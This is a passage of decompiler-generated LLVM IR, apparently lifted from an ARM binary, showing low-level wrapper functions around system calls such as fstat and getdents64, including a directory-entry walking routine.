  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_15100() local_unnamed_addr {
dec_label_pc_15100:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %tmp4 = bitcast i32* %stack_var_-72 to %stat*
  %v0_15110 = load i32, i32* @r0, align 4
  %v4_15110 = call i32 @fstat(i32 %v0_15110, %stat* %tmp4)
  store i32 %v4_15110, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_15110, -4095
  br i1 %tmp, label %dec_label_pc_15134, label %dec_label_pc_15120

dec_label_pc_15120:                               ; preds = %dec_label_pc_15100
  %v0_15120 = call i32 @function_13c70()
  %v0_15124 = load i32, i32* %r4.global-to-local, align 4
  %v1_15124 = sub i32 0, %v0_15124
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1512c = inttoptr i32 %v0_15120 to i32*
  store i32 %v1_15124, i32* %v2_1512c, align 4
  br label %dec_label_pc_15144

dec_label_pc_15134:                               ; preds = %dec_label_pc_15100
  %v2_15134 = icmp eq i32 %v4_15110, 0
  store i32 86340, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_15134, i32 ptrtoint (i32* @global_var_1581c.694 to i32))
  br label %dec_label_pc_15144

dec_label_pc_15144:                               ; preds = %dec_label_pc_15120, %dec_label_pc_15134
  %v0_15144 = load i32, i32* %r4.global-to-local, align 4
  ret i32 %v0_15144

; uselistorder directives
  uselistorder i32 %v4_15110, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 5, 16, 14, 15, 9, 10, 6, 2, 3, 4, 0, 1, 7, 8, 11, 12, 13 }
  uselistorder label %dec_label_pc_15144, { 1, 0 }
}

define i32 @function_15150(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15150:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %v6_15150 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15158 = call i32 @function_151e4()
  store i32 %v0_15158, i32* %r6.global-to-local, align 4
  %tmp8 = icmp slt i32 %v0_15158, 1
  br i1 %tmp8, label %dec_label_pc_151dc, label %dec_label_pc_151c8.preheader

dec_label_pc_151c8.preheader:                     ; preds = %dec_label_pc_15150
  %v5_15160 = load i32, i32* @r4, align 4
  %v7_15160 = add i32 %v5_15160, %v0_15158
  store i32 %v7_15160, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_151c8

dec_label_pc_1516c:                               ; preds = %dec_label_pc_151c8
  %v1_1516c = add i32 %v2_1517c, 16
  %v2_1516c = inttoptr i32 %v1_1516c to i32*
  %v3_1516c = load i32, i32* %v2_1516c, align 4
  store i32 %v3_1516c, i32* @lr, align 4
  %v2_15170 = inttoptr i32 %v1_151cc to i32*
  %v3_15170 = load i32, i32* %v2_15170, align 4
  store i32 %v3_15170, i32* %r2.global-to-local, align 4
  %v1_15174 = add i32 %v2_1517c, 18
  %v2_15174 = inttoptr i32 %v1_15174 to i8*
  %v3_15174 = load i8, i8* %v2_15174, align 1
  %v4_15174 = zext i8 %v3_15174 to i32
  store i32 %v4_15174, i32* %ip.global-to-local, align 4
  %v3_15178 = sdiv i32 %v3_1516c, 256
  store i32 %v3_15178, i32* %r3.global-to-local, align 4
  %v1_1517c = trunc i32 %v3_1516c to i8
  %v4_1517c = inttoptr i32 %v1_151cc to i8*
  store i8 %v1_1517c, i8* %v4_1517c, align 1
  %v0_15180 = load i32, i32* %r2.global-to-local, align 4
  %v1_15180 = load i32, i32* @r4, align 4
  %v2_15180 = add i32 %v1_15180, 4
  %v3_15180 = inttoptr i32 %v2_15180 to i32*
  store i32 %v0_15180, i32* %v3_15180, align 4
  %v0_15184 = load i32, i32* %ip.global-to-local, align 4
  %v1_15184 = trunc i32 %v0_15184 to i8
  %v2_15184 = load i32, i32* @r4, align 4
  %v3_15184 = add i32 %v2_15184, 10
  %v4_15184 = inttoptr i32 %v3_15184 to i8*
  store i8 %v1_15184, i8* %v4_15184, align 1
  %v0_15188 = load i32, i32* %r3.global-to-local, align 4
  %v1_15188 = trunc i32 %v0_15188 to i8
  %v2_15188 = load i32, i32* @r4, align 4
  %v3_15188 = add i32 %v2_15188, 9
  %v4_15188 = inttoptr i32 %v3_15188 to i8*
  store i8 %v1_15188, i8* %v4_15188, align 1
  %v0_1518c = load i32, i32* @r4, align 4
  %v1_1518c = add i32 %v0_1518c, 8
  %v2_1518c = inttoptr i32 %v1_1518c to i8*
  %v3_1518c = load i8, i8* %v2_1518c, align 1
  %v4_1518c = zext i8 %v3_1518c to i32
  store i32 %v4_1518c, i32* %r2.global-to-local, align 4
  %v0_15190 = load i32, i32* @r5, align 4
  %v1_15190 = add i32 %v0_15190, 1
  %v2_15190 = inttoptr i32 %v1_15190 to i8*
  %v3_15190 = load i8, i8* %v2_15190, align 1
  %v4_15190 = zext i8 %v3_15190 to i32
  store i32 %v4_15190, i32* %r3.global-to-local, align 4
  %v4_15194 = mul nuw nsw i32 %v4_15190, 256
  %v5_15194 = or i32 %v4_15194, %v4_1518c
  %v1_15198 = add nsw i32 %v5_15194, -19
  store i32 %v1_15198, i32* @r2, align 4
  %v3_1519c = call i32 @function_13cc0(i32 %v1_151d4, i32 %v1_151d0, i32 %v1_15198)
  %v0_151a0 = load i32, i32* @r4, align 4
  %v1_151a0 = add i32 %v0_151a0, 8
  %v2_151a0 = inttoptr i32 %v1_151a0 to i8*
  %v3_151a0 = load i8, i8* %v2_151a0, align 1
  %v4_151a0 = zext i8 %v3_151a0 to i32
  store i32 %v4_151a0, i32* %r3.global-to-local, align 4
  %v0_151a4 = load i32, i32* @r5, align 4
  %v1_151a4 = add i32 %v0_151a4, 1
  %v2_151a4 = inttoptr i32 %v1_151a4 to i8*
  %v3_151a4 = load i8, i8* %v2_151a4, align 1
  %v4_151a4 = zext i8 %v3_151a4 to i32
  store i32 %v0_151a0, i32* @r0, align 4
  %v4_151ac = mul nuw nsw i32 %v4_151a4, 256
  %v5_151ac = or i32 %v4_151ac, %v4_151a0
  store i32 %v5_151ac, i32* @r2, align 4
  store i32 %v0_151a0, i32* @r1, align 4
  %v3_151b4 = call i32 @function_13cc0(i32 %v0_151a0, i32 %v0_151a0, i32 %v5_151ac)
  %v0_151b8 = load i32, i32* @r4, align 4
  %v1_151b8 = add i32 %v0_151b8, 8
  %v2_151b8 = inttoptr i32 %v1_151b8 to i8*
  %v3_151b8 = load i8, i8* %v2_151b8, align 1
  %v4_151b8 = zext i8 %v3_151b8 to i32
  store i32 %v4_151b8, i32* %r3.global-to-local, align 4
  %v0_151bc = load i32, i32* @r5, align 4
  %v1_151bc = add i32 %v0_151bc, 1
  %v2_151bc = inttoptr i32 %v1_151bc to i8*
  %v3_151bc = load i8, i8* %v2_151bc, align 1
  %v4_151bc = zext i8 %v3_151bc to i32
  store i32 %v4_151bc, i32* @r2, align 4
  %v4_151c0 = mul nuw nsw i32 %v4_151bc, 256
  %v5_151c0 = or i32 %v4_151c0, %v4_151b8
  store i32 %v5_151c0, i32* %r3.global-to-local, align 4
  %v2_151c4 = add i32 %v5_151c0, %v0_151b8
  store i32 %v2_151c4, i32* @r4, align 4
  %v1_151c8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_151c8

dec_label_pc_151c8:                               ; preds = %dec_label_pc_151c8.preheader, %dec_label_pc_1516c
  %v1_151c8 = phi i32 [ %v7_15160, %dec_label_pc_151c8.preheader ], [ %v1_151c8.pre, %dec_label_pc_1516c ]
  %v2_1517c = phi i32 [ %v5_15160, %dec_label_pc_151c8.preheader ], [ %v2_151c4, %dec_label_pc_1516c ]
  %v3_151c8 = icmp ult i32 %v2_1517c, %v1_151c8
  %v1_151cc = add i32 %v2_1517c, 8
  store i32 %v1_151cc, i32* @r5, align 4
  %v1_151d0 = add i32 %v2_1517c, 19
  store i32 %v1_151d0, i32* @r1, align 4
  %v1_151d4 = add i32 %v2_1517c, 11
  store i32 %v1_151d4, i32* @r0, align 4
  br i1 %v3_151c8, label %dec_label_pc_1516c, label %dec_label_pc_151dc.loopexit

dec_label_pc_151dc.loopexit:                      ; preds = %dec_label_pc_151c8
  %v0_151dc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_151dc

dec_label_pc_151dc:                               ; preds = %dec_label_pc_15150, %dec_label_pc_151dc.loopexit
  %v0_151dc = phi i32 [ %v0_151dc.pre, %dec_label_pc_151dc.loopexit ], [ %v0_15158, %dec_label_pc_15150 ]
  store i32 %v6_15150, i32* @r5, align 4
  ret i32 %v0_151dc

; uselistorder directives
  uselistorder i32 %v1_151d4, { 1, 0 }
  uselistorder i32 %v1_151d0, { 1, 0 }
  uselistorder i32 %v1_151cc, { 2, 1, 0 }
  uselistorder i32 %v2_1517c, { 4, 3, 2, 5, 1, 0 }
  uselistorder i32 %v0_151a0, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v3_1516c, { 1, 0, 2 }
  uselistorder i32 %v5_15160, { 1, 0 }
  uselistorder i32 %v0_15158, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @function_13cc0, { 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_151dc, { 1, 0 }
  uselistorder label %dec_label_pc_151c8, { 1, 0 }
}

define i32 @function_151e4() local_unnamed_addr {
dec_label_pc_151e4:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_151e8 = load i32, i32* @r4, align 4
  %v9_151e8 = load i32, i32* @r6, align 4
  %v0_151ec = load i32, i32* @r2, align 4
  %v1_151ec = add i32 %v0_151ec, 6
  %v2_151f4 = ptrtoint i32* %stack_var_-60 to i32
  %v1_151f8 = and i32 %v1_151ec, -4
  store i32 %v1_151f8, i32* %r3.global-to-local, align 4
  %v2_151fc = sub i32 %v2_151f4, %v1_151f8
  %v0_15200 = load i32, i32* @r1, align 4
  store i32 %v0_15200, i32* %r8.global-to-local, align 4
  store i32 %v0_151ec, i32* %stack_var_-60, align 4
  store i32 %v2_151fc, i32* %sl.global-to-local, align 4
  %v0_1520c = load i32, i32* @r0, align 4
  %v1_15210 = inttoptr i32 %v2_151fc to %linux_dirent64*
  store i32 %v2_151fc, i32* %r1.global-to-local, align 4
  %v5_15214 = call i32 @getdents64(i32 %v0_1520c, %linux_dirent64* %v1_15210, i32 %v0_151ec)
  store i32 %v5_15214, i32* @r6, align 4
  %tmp = icmp ult i32 %v5_15214, -4095
  br i1 %tmp, label %dec_label_pc_15238, label %dec_label_pc_15224

dec_label_pc_15224:                               ; preds = %dec_label_pc_151e4
  %v0_15224 = call i32 @function_13c70()
  %v0_15228 = load i32, i32* @r6, align 4
  %v1_15228 = sub i32 0, %v0_15228
  store i32 %v1_15228, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  %v2_15230 = inttoptr i32 %v0_15224 to i32*
  store i32 %v1_15228, i32* %v2_15230, align 4
  %v0_15240.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15240

dec_label_pc_15238:                               ; preds = %dec_label_pc_151e4
  br i1 false, label %dec_label_pc_15240, label %dec_label_pc_15248

dec_label_pc_15240:                               ; preds = %dec_label_pc_15238, %dec_label_pc_15224
  %v0_15240 = phi i32 [ -1, %dec_label_pc_15238 ], [ %v0_15240.pre, %dec_label_pc_15224 ]
  store i32 %v0_15240, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1533c

dec_label_pc_15248:                               ; preds = %dec_label_pc_15238
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_15250 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15250, i32* @r5, align 4
  %v0_15254 = load i32, i32* @sp, align 4
  store i32 %v0_15254, i32* @r4, align 4
  br label %dec_label_pc_15318

dec_label_pc_15264:                               ; preds = %dec_label_pc_15318
  %v2_15330 = add i32 %v3_1531c, %v0_15330
  %v1_15264 = add i32 %v0_15268, 17
  %v2_15264 = inttoptr i32 %v1_15264 to i8*
  %v3_15264 = load i8, i8* %v2_15264, align 1
  %v4_15264 = zext i8 %v3_15264 to i32
  %v2_15268 = inttoptr i32 %v1_15324 to i8*
  %v3_15268 = load i8, i8* %v2_15268, align 1
  %v4_15268 = zext i8 %v3_15268 to i32
  %v4_1526c = mul nuw nsw i32 %v4_15264, 256
  %v5_1526c = or i32 %v4_15268, %v4_1526c
  %v1_15270 = add nuw nsw i32 %v5_1526c, 3
  %v1_15274 = and i32 %v1_15270, 131068
  store i32 %v1_15274, i32* %r3.global-to-local, align 4
  %v2_15278 = add i32 %v1_15274, %v2_152b8
  store i32 %v2_15278, i32* %sb.global-to-local, align 4
  %v9_1527c = icmp eq i32 %v2_15278, %v2_15330
  %v1_15280 = and i32 %v1_15270, 128
  %v2_15284 = icmp eq i32 %v1_15280, 0
  %v3_15284 = or i1 %v9_1527c, %v2_15284
  br i1 %v3_15284, label %dec_label_pc_152b8, label %dec_label_pc_15288

dec_label_pc_15288:                               ; preds = %dec_label_pc_15264
  store i32 %stack_var_-52.0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_15298 = call i32 @function_153f8(i32 %v0_1520c, i32 %stack_var_-52.0, i32 %stack_var_-48.0, i32 0)
  %v0_1529c = load i32, i32* @r5, align 4
  %v1_1529c = load i32, i32* %r8.global-to-local, align 4
  %v9_1529c = icmp eq i32 %v0_1529c, %v1_1529c
  br i1 %v9_1529c, label %dec_label_pc_152a4, label %dec_label_pc_15338

dec_label_pc_152a4:                               ; preds = %dec_label_pc_15288
  %v0_152a4 = call i32 @function_13c70()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_152b0 = inttoptr i32 %v0_152a4 to i32*
  store i32 22, i32* %v2_152b0, align 4
  %v0_1533c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1533c

dec_label_pc_152b8:                               ; preds = %dec_label_pc_15264
  %v3_1528011 = udiv i32 %v1_15270, 256
  %v1_152b8 = trunc i32 %v3_1528011 to i8
  %v3_152b8 = add i32 %v2_152b8, 17
  %v4_152b8 = inttoptr i32 %v3_152b8 to i8*
  store i8 %v1_152b8, i8* %v4_152b8, align 1
  %v0_152bc = load i32, i32* %r3.global-to-local, align 4
  %v1_152bc = trunc i32 %v0_152bc to i8
  %v2_152bc = load i32, i32* @r5, align 4
  %v3_152bc = add i32 %v2_152bc, 16
  %v4_152bc = inttoptr i32 %v3_152bc to i8*
  store i8 %v1_152bc, i8* %v4_152bc, align 1
  %v0_152c0 = load i32, i32* @r4, align 4
  %v1_152c0 = add i32 %v0_152c0, 8
  %v1_152c4 = inttoptr i32 %v1_152c0 to i32*
  %v2_152c4 = load i32, i32* %v1_152c4, align 4
  %v3_152c4 = add i32 %v0_152c0, 12
  %v4_152c4 = inttoptr i32 %v3_152c4 to i32*
  %v5_152c4 = load i32, i32* %v4_152c4, align 4
  store i32 %v5_152c4, i32* %r3.global-to-local, align 4
  %v1_152d0 = inttoptr i32 %v0_152c0 to i32*
  %v2_152d0 = load i32, i32* %v1_152d0, align 4
  %v3_152d0 = add i32 %v0_152c0, 4
  %v4_152d0 = inttoptr i32 %v3_152d0 to i32*
  %v5_152d0 = load i32, i32* %v4_152d0, align 4
  store i32 %v5_152d0, i32* %r3.global-to-local, align 4
  %v0_152d4 = load i32, i32* @r5, align 4
  %v1_152d4 = inttoptr i32 %v0_152d4 to i32*
  store i32 %v2_152d0, i32* %v1_152d4, align 4
  %v3_152d4 = add i32 %v0_152d4, 4
  %v4_152d4 = inttoptr i32 %v3_152d4 to i32*
  %v5_152d4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_152d4, i32* %v4_152d4, align 4
  %v0_152d8 = load i32, i32* @r4, align 4
  %v1_152d8 = add i32 %v0_152d8, 8
  %v1_152dc = inttoptr i32 %v1_152d8 to i32*
  %v2_152dc = load i32, i32* %v1_152dc, align 4
  %v3_152dc = add i32 %v0_152d8, 12
  %v4_152dc = inttoptr i32 %v3_152dc to i32*
  %v5_152dc = load i32, i32* %v4_152dc, align 4
  store i32 %v5_152dc, i32* %r3.global-to-local, align 4
  %v1_152e0 = load i32, i32* @r5, align 4
  %v2_152e0 = add i32 %v1_152e0, 8
  %v3_152e0 = inttoptr i32 %v2_152e0 to i32*
  store i32 %v2_152dc, i32* %v3_152e0, align 4
  %v0_152e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_152e4 = load i32, i32* @r5, align 4
  %v2_152e4 = add i32 %v1_152e4, 12
  %v3_152e4 = inttoptr i32 %v2_152e4 to i32*
  store i32 %v0_152e4, i32* %v3_152e4, align 4
  %v0_152e8 = load i32, i32* @r4, align 4
  %v1_152e8 = add i32 %v0_152e8, 18
  %v2_152e8 = inttoptr i32 %v1_152e8 to i8*
  %v3_152e8 = load i8, i8* %v2_152e8, align 1
  %v4_152e8 = zext i8 %v3_152e8 to i32
  store i32 %v4_152e8, i32* %r3.global-to-local, align 4
  %v2_152ec = load i32, i32* @r5, align 4
  %v3_152ec = add i32 %v2_152ec, 18
  %v4_152ec = inttoptr i32 %v3_152ec to i8*
  store i8 %v3_152e8, i8* %v4_152ec, align 1
  %v0_152f0 = load i32, i32* @r4, align 4
  %v1_152f0 = add i32 %v0_152f0, 16
  %v2_152f0 = inttoptr i32 %v1_152f0 to i8*
  %v3_152f0 = load i8, i8* %v2_152f0, align 1
  %v4_152f0 = zext i8 %v3_152f0 to i32
  %v0_152f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_152f4 = add i32 %v0_152f4, 1
  %v2_152f4 = inttoptr i32 %v1_152f4 to i8*
  %v3_152f4 = load i8, i8* %v2_152f4, align 1
  %v4_152f4 = zext i8 %v3_152f4 to i32
  store i32 %v4_152f4, i32* %r3.global-to-local, align 4
  %v4_152f8 = mul nuw nsw i32 %v4_152f4, 256
  %v5_152f8 = or i32 %v4_152f8, %v4_152f0
  %v1_152fc = add nsw i32 %v5_152f8, -19
  store i32 %v1_152fc, i32* @r2, align 4
  %v3_15300 = call i32 @function_13cb0(i32 %v1_15328, i32 %v1_1532c, i32 %v1_152fc)
  %v0_15304 = load i32, i32* @r4, align 4
  %v1_15304 = add i32 %v0_15304, 16
  %v2_15304 = inttoptr i32 %v1_15304 to i8*
  %v3_15304 = load i8, i8* %v2_15304, align 1
  %v4_15304 = zext i8 %v3_15304 to i32
  store i32 %v4_15304, i32* %r3.global-to-local, align 4
  %v0_15308 = load i32, i32* %r7.global-to-local, align 4
  %v1_15308 = add i32 %v0_15308, 1
  %v2_15308 = inttoptr i32 %v1_15308 to i8*
  %v3_15308 = load i8, i8* %v2_15308, align 1
  %v4_15308 = zext i8 %v3_15308 to i32
  %v4_1530c = mul nuw nsw i32 %v4_15308, 256
  %v5_1530c = or i32 %v4_1530c, %v4_15304
  store i32 %v5_1530c, i32* %r3.global-to-local, align 4
  %v2_15310 = add i32 %v5_1530c, %v0_15304
  store i32 %v2_15310, i32* @r4, align 4
  %v0_15314 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15314, i32* @r5, align 4
  %v1_15318.pre = load i32, i32* @r6, align 4
  %v0_15330.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15318

dec_label_pc_15318:                               ; preds = %dec_label_pc_15248, %dec_label_pc_152b8
  %stack_var_-52.0 = phi i32 [ -1, %dec_label_pc_15248 ], [ %v2_152c4, %dec_label_pc_152b8 ]
  %v0_15330 = phi i32 [ %v0_15250, %dec_label_pc_15248 ], [ %v0_15330.pre, %dec_label_pc_152b8 ]
  %v2_152b8 = phi i32 [ %v0_15250, %dec_label_pc_15248 ], [ %v0_15314, %dec_label_pc_152b8 ]
  %v0_15268 = phi i32 [ %v0_15254, %dec_label_pc_15248 ], [ %v2_15310, %dec_label_pc_152b8 ]
  %v1_15318 = phi i32 [ %v5_15214, %dec_label_pc_15248 ], [ %v1_15318.pre, %dec_label_pc_152b8 ]
  %stack_var_-48.0 = phi i32 [ -1, %dec_label_pc_15248 ], [ %v5_152c4, %dec_label_pc_152b8 ]
  %v0_15318 = load i32, i32* %sl.global-to-local, align 4
  %v2_15318 = add i32 %v0_15318, %v1_15318
  store i32 %v2_15318, i32* %r3.global-to-local, align 4
  %v3_1531c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_1531c, i32* @r2, align 4
  %v3_15320 = icmp ult i32 %v0_15268, %v2_15318
  %v1_15324 = add i32 %v0_15268, 16
  store i32 %v1_15324, i32* %r7.global-to-local, align 4
  %v1_15328 = add i32 %v2_152b8, 19
  store i32 %v1_15328, i32* @r0, align 4
  %v1_1532c = add i32 %v0_15268, 19
  store i32 %v1_1532c, i32* @r1, align 4
  br i1 %v3_15320, label %dec_label_pc_15264, label %dec_label_pc_15338

dec_label_pc_15338:                               ; preds = %dec_label_pc_15318, %dec_label_pc_15288
  %v1_15338 = phi i32 [ %v0_1529c, %dec_label_pc_15288 ], [ %v2_152b8, %dec_label_pc_15318 ]
  %v0_15338 = phi i32 [ %v1_1529c, %dec_label_pc_15288 ], [ %v0_15330, %dec_label_pc_15318 ]
  %v2_15338 = sub i32 %v1_15338, %v0_15338
  store i32 %v2_15338, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1533c

dec_label_pc_1533c:                               ; preds = %dec_label_pc_152a4, %dec_label_pc_15240, %dec_label_pc_15338
  %v0_1533c = phi i32 [ %v0_1533c.pre, %dec_label_pc_152a4 ], [ %v0_15240, %dec_label_pc_15240 ], [ %v2_15338, %dec_label_pc_15338 ]
  store i32 %v3_151e8, i32* @r4, align 4
  store i32 %v9_151e8, i32* %r6.global-to-local, align 4
  ret i32 %v0_1533c

; uselistorder directives
  uselistorder i32 %v1_1532c, { 1, 0 }
  uselistorder i32 %v1_15328, { 1, 0 }
  uselistorder i32 %v1_15324, { 1, 0 }
  uselistorder i32 %v3_1531c, { 1, 0 }
  uselistorder i32 %v0_15268, { 2, 1, 3, 0 }
  uselistorder i32 %v2_152b8, { 0, 3, 1, 2 }
  uselistorder i32 %v0_152c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15250, { 1, 0, 2 }
  uselistorder i32 %v5_15214, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @function_13cb0, { 7, 1, 0, 3, 5, 4, 6, 8, 2 }
  uselistorder i32 128, { 12, 13, 36, 14, 37, 26, 17, 18, 19, 32, 2, 33, 20, 21, 22, 23, 24, 29, 3, 27, 4, 28, 5, 15, 16, 30, 31, 7, 0, 1, 8, 9, 10, 34, 6, 35, 25, 11 }
  uselistorder i32* @sp, { 4, 5, 1, 6, 0, 7, 2, 8, 3 }
  uselistorder i32* @r6, { 3, 118, 119, 120, 435, 437, 436, 366, 367, 318, 319, 320, 321, 322, 323, 324, 325, 353, 368, 369, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 326, 327, 79, 78, 80, 81, 82, 83, 84, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 350, 351, 352, 345, 346, 347, 348, 349, 4, 98, 2, 99, 100, 1, 101, 102, 280, 281, 282, 0, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 103, 104, 105, 106, 5, 107, 108, 109, 110, 111, 15, 112, 113, 114, 115, 116, 117, 139, 140, 141, 142, 14, 143, 144, 145, 6, 146, 147, 148, 7, 149, 8, 150, 9, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 354, 357, 355, 356, 358, 359, 16, 360, 361, 362, 363, 364, 365, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 10, 380, 381, 382, 383, 384, 385, 387, 11, 386, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 12, 13, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434 }
  uselistorder label %dec_label_pc_1533c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15318, { 1, 0 }
}

define i32 @function_15348() local_unnamed_addr {
dec_label_pc_15348:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15348 = load i32, i32* @r4, align 4
  store i32 %v3_15348, i32* %stack_var_-8, align 4
  %v0_15350 = load i32, i32* @r0, align 4
  store i32 %v0_15350, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15350, -4095
  br i1 %tmp, label %dec_label_pc_1536c, label %dec_label_pc_1535c

dec_label_pc_1535c:                               ; preds = %dec_label_pc_15348
  %v0_1535c = call i32 @function_13c70()
  %v0_15360 = load i32, i32* %r4.global-to-local, align 4
  %v1_15360 = sub i32 0, %v0_15360
  %v2_15364 = inttoptr i32 %v0_1535c to i32*
  store i32 %v1_15360, i32* %v2_15364, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_15370.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1536c

dec_label_pc_1536c:                               ; preds = %dec_label_pc_15348, %dec_label_pc_1535c
  %v2_15370 = phi i32 [ %v3_15348, %dec_label_pc_15348 ], [ %v2_15370.pre, %dec_label_pc_1535c ]
  %v0_1536c = phi i32 [ %v0_15350, %dec_label_pc_15348 ], [ -1, %dec_label_pc_1535c ]
  store i32 %v2_15370, i32* @r4, align 4
  ret i32 %v0_1536c

; uselistorder directives
  uselistorder i32 %v0_15350, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1536c, { 1, 0 }
}

define i32 @function_15374() local_unnamed_addr {
dec_label_pc_15374:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15374 = load i32, i32* @r4, align 4
  store i32 %v3_15374, i32* %stack_var_-8, align 4
  %v0_1537c = load i32, i32* @r0, align 4
  store i32 %v0_1537c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1537c, -4095
  br i1 %tmp, label %dec_label_pc_15398, label %dec_label_pc_15388

dec_label_pc_15388:                               ; preds = %dec_label_pc_15374
  %v0_15388 = call i32 @function_13c70()
  %v0_1538c = load i32, i32* %r4.global-to-local, align 4
  %v1_1538c = sub i32 0, %v0_1538c
  %v2_15390 = inttoptr i32 %v0_15388 to i32*
  store i32 %v1_1538c, i32* %v2_15390, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1539c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15398

dec_label_pc_15398:                               ; preds = %dec_label_pc_15374, %dec_label_pc_15388
  %v2_1539c = phi i32 [ %v3_15374, %dec_label_pc_15374 ], [ %v2_1539c.pre, %dec_label_pc_15388 ]
  %v0_15398 = phi i32 [ %v0_1537c, %dec_label_pc_15374 ], [ -1, %dec_label_pc_15388 ]
  store i32 %v2_1539c, i32* @r4, align 4
  ret i32 %v0_15398

; uselistorder directives
  uselistorder i32 %v0_1537c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15398, { 1, 0 }
}

define i32 @function_153a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_153a0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_153a0 = load i32, i32* @r4, align 4
  store i32 %v3_153a0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_153c4, label %dec_label_pc_153b4

